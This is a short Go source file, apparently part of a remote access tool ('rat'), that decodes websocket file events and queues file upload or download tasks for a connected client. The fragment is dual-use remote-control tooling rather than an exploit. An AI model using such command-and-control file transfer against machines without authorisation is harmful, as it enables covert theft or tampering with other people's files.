package main

import (
	"encoding/json"
	"rat/shared"

	"golang.org/x/net/websocket"
)

type FileEvent struct {
	File        string `json:"file"`
	Destination string `json:"destination,omitempty"`
	Task        int    `json:"task"`
}

type FileMessage Message

func (d FileMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var fileEvent FileEvent
	err := json.Unmarshal([]byte(data), &fileEvent)
	if err != nil {
		return err
	}

	client.Queue <- &FilePacket{shared.FileTask(fileEvent.Task), fileEvent.File, fileEvent.Destination}

	return nil
}
